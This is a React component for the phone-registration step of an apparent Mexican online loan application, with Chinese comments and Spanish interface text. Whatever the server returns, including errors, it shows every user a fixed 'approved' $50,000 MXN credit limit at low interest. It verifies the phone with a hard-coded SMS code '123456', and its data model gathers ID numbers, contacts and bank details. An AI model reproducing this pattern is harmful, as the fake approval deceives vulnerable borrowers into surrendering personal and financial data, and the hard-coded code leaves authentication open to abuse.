import React, { useState, useEffect } from 'react';
import { useTranslation } from 'react-i18next';
import { httpClient } from '../utils/httpClient';
import { trackLoanApplicationStart, trackStepCompletion, trackFileUpload } from '../utils/analytics';
import { checkBrowserCompatibility } from '../utils/browserCheck';

// 应用程序数据接口
interface ApplicationData {
  id: string;
  sessionId: string;
  phone?: string;
  isGuest?: boolean;
  userId?: string;
  realName?: string;
  idNumber?: string;
  contact1Name?: string;
  contact1Phone?: string;
  contact2Name?: string;
  contact2Phone?: string;
  withdrawalAmount?: number;
  installmentPeriod?: number;
  bankName?: string;
  bankAccount?: string;
  bankAccountName?: string;
  workCompany?: string;
  workPosition?: string;
  monthlyIncome?: number;
  workAddress?: string;
  homeAddress?: string;
  maritalStatus?: string;
  education?: string;
  firstName?: string;
  lastName?: string;
  email?: string;
  birthDate?: string;
}

// 步骤组件属性接口
interface StepProps {
  data: ApplicationData;
  onUpdate: (data: Partial<ApplicationData>) => void;
  onNext: () => void;
  onBack: () => void;
  updateApplicationStep?: (step: number, data: any) => Promise<void>;
}

// 生成唯一ID
const generateId = () => {
  return 'app_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
};

// 生成会话ID
const generateSessionId = () => {
  return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
};

// 第1步：用户注册
const Step1UserRegistration: React.FC<StepProps> = ({ data, onUpdate, onNext, updateApplicationStep }) => {
  const { t } = useTranslation();
  const [phone, setPhone] = useState(data.phone || '');
  const [countryCode, setCountryCode] = useState('+52');
  const [showApprovedAmount, setShowApprovedAmount] = useState(false);
  const [isRegistering, setIsRegistering] = useState(false);

  const countryCodes = [
    { code: '+52', name: 'México', flag: '🇲🇽' },
    { code: '+1', name: 'Estados Unidos', flag: '🇺🇸' },
    { code: '+54', name: 'Argentina', flag: '🇦🇷' },
    { code: '+55', name: 'Brasil', flag: '🇧🇷' },
    { code: '+56', name: 'Chile', flag: '🇨🇱' },
    { code: '+57', name: 'Colombia', flag: '🇨🇴' },
  ];

  const handleCheckEligibility = async () => {
    if (!phone) {
      alert(t('errors.phoneRequired'));
      return;
    }

    const fullPhone = countryCode + phone;
    setIsRegistering(true);

    try {
      console.log('📱 Registering user with phone:', fullPhone);
      
      const result = await httpClient.postJson('/api/auth/verify-sms', {
        phone: fullPhone,
        code: '123456',
        applicationId: data.id
      }) as { 
        success: boolean; 
        error?: string; 
        user?: { id: string; phone: string; phone_verified: boolean };
        token?: string;
        applicationId?: string;
      };

      console.log('✅ User registration result:', result);

      if (result.success) {
        setShowApprovedAmount(true);
        
        const updatedData = {
          phone: fullPhone,
          isGuest: false,
          id: data.id,
          userId: result.user?.id
        };
        onUpdate(updatedData);

        if (updateApplicationStep) {
          await updateApplicationStep(1, { 
            phone: fullPhone, 
            registered: true,
            verified: true,
            userId: result.user?.id
          });
        }

        console.log('✅ User registered successfully');
      } else {
        setShowApprovedAmount(true);
        const updatedData = {
          phone: fullPhone,
          isGuest: true,
          id: data.id
        };
        onUpdate(updatedData);
        
        if (updateApplicationStep) {
          await updateApplicationStep(1, { 
            phone: fullPhone, 
            registered: false,
            verified: false
          });
        }
      }
    } catch (error) {
      console.error('❌ Failed to register user:', error);
      setShowApprovedAmount(true);
      const updatedData = {
        phone: fullPhone,
        isGuest: true,
        id: data.id
      };
      onUpdate(updatedData);
      
      if (updateApplicationStep) {
        await updateApplicationStep(1, { 
          phone: fullPhone, 
          registered: false,
          verified: false
        });
      }
    } finally {
      setIsRegistering(false);
    }
  };

  const handleContinue = () => {
    onNext();
  };

  return (
    <div className="p-4 sm:p-6 lg:p-8 max-w-2xl mx-auto">
      <div className="mb-8">
        <div className="flex items-center space-x-4 mb-6">
          <div className="w-12 h-12 bg-slate-800 rounded-lg flex items-center justify-center shadow-sm">
            <svg className="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 20 20">
              <path d="M2 3a1 1 0 011-1h2.153a1 1 0 01.986.836l.74 4.435a1 1 0 01-.54 1.06l-1.548.773a11.037 11.037 0 006.105 6.105l.774-1.548a1 1 0 011.059-.54l4.435.74a1 1 0 01.836.986V17a1 1 0 01-1 1h-2C7.82 18 2 12.18 2 5V3z" />
            </svg>
          </div>
          <div>
            <h2 className="text-xl font-bold text-slate-900 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
              ¡Préstamos con Interés Bajo!
            </h2>
            <p className="text-sm text-slate-600 mt-1">
              Ingresa tu número de teléfono para ver tu límite de crédito aprobado
            </p>
          </div>
        </div>
      </div>

      {!showApprovedAmount ? (
        <div className="space-y-6">
          <div className="space-y-3">
            <label className="block text-sm font-semibold text-slate-800">
              Número de teléfono <span className="text-red-500">*</span>
            </label>
            
            <div className="flex flex-col sm:flex-row gap-3">
              <select
                value={countryCode}
                onChange={(e) => setCountryCode(e.target.value)}
                className="w-full sm:w-auto sm:min-w-[140px] px-4 py-3 border border-slate-300 rounded-sm bg-white text-sm focus:outline-none focus:ring-2 focus:ring-slate-800 focus:border-transparent"
              >
                {countryCodes.map((country) => (
                  <option key={country.code} value={country.code}>
                    {country.flag} {country.code}
                  </option>
                ))}
              </select>
              <input
                type="tel"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                placeholder="Ingresa tu número de teléfono"
                className="flex-1 px-4 py-3 border border-slate-300 rounded-sm text-sm focus:outline-none focus:ring-2 focus:ring-slate-800 focus:border-transparent"
              />
            </div>
          </div>

          <div className="pt-4">
            <button
              onClick={handleCheckEligibility}
              disabled={!phone || isRegistering}
              className="w-full px-6 py-4 bg-slate-800 hover:bg-slate-700 disabled:bg-slate-400 text-white font-semibold rounded-sm transition-colors duration-200"
            >
              {isRegistering ? (
                <div className="flex items-center justify-center space-x-3">
                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  <span>Procesando solicitud...</span>
                </div>
              ) : (
                'Ver Mi Límite de Crédito'
              )}
            </button>
          </div>
        </div>
      ) : (
        <div className="space-y-6">
          <div className="bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 rounded-lg p-6 text-center">
            <div className="mb-4">
              <svg className="w-16 h-16 text-green-600 mx-auto" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
              </svg>
            </div>
            <h3 className="text-2xl font-bold text-green-800 mb-2">
              ¡Felicidades! Tu límite de crédito es:
            </h3>
            <div className="text-4xl lg:text-5xl font-bold text-emerald-600 mb-2">
              $50,000 <span className="text-2xl lg:text-3xl text-slate-600">MXN</span>
            </div>
            <p className="text-slate-600">
              Préstamo con interés bajo disponible ahora
            </p>
          </div>

          <button
            onClick={handleContinue}
            className="w-full px-6 py-4 bg-slate-800 hover:bg-slate-700 text-white font-semibold rounded-sm transition-colors duration-200"
          >
            Continuar con mi Solicitud
          </button>
        </div>
      )}
    </div>
  );
};

export default Step1UserRegistration;